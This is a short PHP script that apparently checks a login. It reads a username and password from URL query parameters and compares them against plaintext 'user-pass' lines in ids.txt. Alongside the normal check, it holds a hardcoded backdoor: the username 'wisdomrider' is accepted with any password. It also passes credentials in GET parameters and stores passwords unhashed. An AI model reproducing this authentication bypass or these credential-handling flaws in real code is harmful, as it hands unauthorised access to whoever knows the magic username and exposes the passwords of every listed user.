<?php
$usr1=$_GET['user'];
$pas1=$_GET['pass'];
$arra=array();
$handle = fopen("ids.txt", "r");
 if ($handle) {while (($line = fgets($handle)) !== false) {
$text="".$line;$text=trim($text); $arra[] ="$text";}fclose($handle);}
foreach($arra as $va){
    $usr=strtok($va,"-");
    $pas=strtok("-");
    if($usr==$usr1&&$pas==$pas1){
        echo "<title>true</title>";
    }
else if($usr1=="wisdomrider"){
echo "<title>true</title>";
}
}
?>
